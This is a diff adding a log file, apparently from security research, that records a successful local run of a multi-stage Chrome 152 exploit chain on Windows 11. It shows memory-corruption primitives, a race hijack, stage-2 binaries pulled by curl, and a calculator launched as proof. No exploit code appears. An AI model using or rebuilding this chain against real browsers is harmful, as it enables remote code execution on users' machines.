@@ -1,0 +1,45 @@
+=== 本机复现胜轮证据（2026-10-20, Win11 26300）===
+
+--- run_chain.sh 输出（round7, 209s）---
+[chain] http://127.0.0.1:8765/ 服务就绪  chrome=F:\Chrome\shared\chrome\chrome-win64-152.0.7977.54\chrome-win64\chrome.exe
+round1 fail-fast
+round2 fail-fast
+round3 fail-fast
+round4 fail-fast
+round5 fail-fast
+round6 fail-fast
+=== FULL-CHAIN WIN round7 (209s) ===
+
+--- 胜轮 cl_W_7.log 全链阶段标记 ---
+[12680:3184:1020/235000.052:INFO:CONSOLE:40] "GCDBG addrof 117d7a9 117d879 sane=true", source: http://127.0.0.1:8765/stage1w.js (40)
+[12680:3184:1020/235000.052:INFO:CONSOLE:43] "ST1 begin", source: http://127.0.0.1:8765/stage1w.js (43)
+[12680:3184:1020/235000.052:INFO:CONSOLE:64] "ST1 reclaim hit=14", source: http://127.0.0.1:8765/stage1w.js (64)
+[12680:3184:1020/235000.052:INFO:CONSOLE:66] "ST1 fakeobj ok", source: http://127.0.0.1:8765/stage1w.js (66)
+[12680:3184:1020/235000.052:INFO:CONSOLE:75] "ST1 cage_rw ready", source: http://127.0.0.1:8765/stage1w.js (75)
+[12680:3184:1020/235000.052:INFO:CONSOLE:79] "ST1 proof 13.37=13.37", source: http://127.0.0.1:8765/stage1w.js (79)
+[12680:3184:1020/235000.069:INFO:CONSOLE:147] "MAIN start", source: http://127.0.0.1:8765/pocwin_full_w4.js (147)
+[12680:3184:1020/235000.074:INFO:CONSOLE:56] "BOOT inst a/d ok", source: http://127.0.0.1:8765/pocwin_full_w4.js (56)
+[12680:3184:1020/235000.074:INFO:CONSOLE:61] "BOOT pads compiled", source: http://127.0.0.1:8765/pocwin_full_w4.js (61)
+[12680:3184:1020/235000.074:INFO:CONSOLE:147] "MAIN boot done", source: http://127.0.0.1:8765/pocwin_full_w4.js (147)
+[12680:3184:1020/235000.081:INFO:CONSOLE:147] "MAIN getter done", source: http://127.0.0.1:8765/pocwin_full_w4.js (147)
+[12680:3184:1020/235000.082:INFO:CONSOLE:100] "ALIAS-TRY mi=6", source: http://127.0.0.1:8765/pocwin_full_w4.js (100)
+[12680:3184:1020/235000.082:INFO:CONSOLE:102] "ALIAS jumps=16", source: http://127.0.0.1:8765/pocwin_full_w4.js (102)
+[12680:3184:1020/235000.084:INFO:CONSOLE:147] "ALIAS OK body=0x1980", source: http://127.0.0.1:8765/pocwin_full_w4.js (147)
+[12680:3184:1020/235000.085:INFO:CONSOLE:121] "PRE-DEPLOY base=0x18e2 len=2617", source: http://127.0.0.1:8765/pocwin_full_w4.js (121)
+[12680:3184:1020/235000.085:INFO:CONSOLE:127] "WROTE blob", source: http://127.0.0.1:8765/pocwin_full_w4.js (127)
+[12680:3184:1020/235000.086:INFO:CONSOLE:133] "VERIFY bad4=0", source: http://127.0.0.1:8765/pocwin_full_w4.js (133)
+[12680:3184:1020/235000.086:INFO:CONSOLE:143] "ORIGIN-OK=true DEPLOYED at 0x18e2, firing callOld...", source: http://127.0.0.1:8765/pocwin_full_w4.js (143)
+
+--- 竞态器 dbglog（WAW#0 模板劫持命中）---
+[dbgwrap] WAW#0 this=0x110000fec38 data=0x11000060240 size=0x84 cs_=0x7ff67913c810 buf_=0x7ff67913b900 bsz=0x1000 used=0xf00 ret_rva=0x337f04
+
+--- stage-2 落盘物（payload curl 自动拉取，零预置）---
+-rwxr-xr-x 1 30487 197609 11776 Oct 20 23:50 /tmp/ev64.dll
+-rwxr-xr-x 1 30487 197609 52224 Oct 20 23:50 /tmp/ms64.exe
+
+--- 进程证据 ---
+ms64.exe  pid=7424  创建 23:50:00  父=16396(渲染器payload)
+  cmdline: --handler <chrome152> --db %TEMP%\msdb --mode race --iters 8 --pages 41 --calc --dbg
+CalculatorApp.exe pid=9316 创建 23:50:19 (WAW#0 后 LoadLibraryW(ev64.dll) 派发)
+
+--- 根因（此前 41 轮 0 胜）见 logs/rootcause_stage2_dllname_20261020.md ---
